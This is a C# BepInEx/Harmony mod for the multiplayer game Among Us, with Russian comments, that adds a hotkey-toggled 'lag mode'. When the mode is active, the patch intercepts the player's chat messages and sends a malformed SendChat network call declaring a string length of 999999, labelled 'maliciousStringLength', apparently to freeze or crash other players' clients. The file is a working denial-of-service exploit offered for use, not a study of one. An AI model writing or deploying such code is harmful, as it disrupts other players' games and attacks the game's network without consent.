using BepInEx;
using BepInEx.Logging;
using HarmonyLib;
using System;
using AmongUs.GameOptions;
using Hazel;
using UnityEngine;

namespace AmongUsLagMod
{
    [BepInPlugin(id, plugin_name, versionString)]
    public class Plugin : BasePlugin
    {
        public const string id = "com.yourname.amonguslagmod";
        public const string plugin_name = "Among Us Lag Mod";
        public const string versionString = "1.0.0";

        private readonly Harmony harmony = new Harmony(id);

        public static bool IsLagEnabled = false;

        public override void Load()
        {
            Log.LogInfo($"Плагин {plugin_name} загружен!");

            harmony.PatchAll();
            
            if (InputManager.Exists)
            {
                InputManager.Instance.AddKeyDownAction(KeyCode.L, () => {
                    IsLagEnabled = !IsLagEnabled;
                    Log.LogInfo($"Режим зависания: {(IsLagEnabled ? "ВКЛ" : "ВЫКЛ")}");
                });
            }
            else
            {
                Log.LogWarning("InputManager не найден. Управление с клавиатуры не будет работать.");
            }
        }
        public override void Unload()
        {
            harmony.UnpatchSelf();
            Log.LogInfo($"Плагин {plugin_name} выгружен.");
            base.Unload();
        }
    }

    [HarmonyPatch]
    internal static class Patches
    {
        [HarmonyPatch(typeof(PlayerControl), nameof(PlayerControl.RpcSendChat))]
        [HarmonyPrefix]
        private static bool RpcSendChat_Prefix(PlayerControl __instance, string chatText)
        {
            if (!Plugin.IsLagEnabled)
            {
                return true;
            }

            // Для логирования из статического класса нужно получить доступ к логгеру плагина.
            // Один из способов - передать его в конструктор, но проще сделать его публичным статическим.
            // В данном примере мы оставим логирование в основном классе плагина.
            // Если нужно здесь, можно сделать Log в Plugin публичным статическим.
            // Plugin.Log.LogWarning("Перехват отправки чата..."); // <-- так сработает, если Log в Plugin публичный

            MessageWriter writer = AmongUsClient.Instance.StartRpc(__instance.NetId, (byte)RpcCalls.SendChat);
            int maliciousStringLength = 999999;
            writer.Write(maliciousStringLength);
            writer.EndMessage();
            
            return false;
        }
    }
}
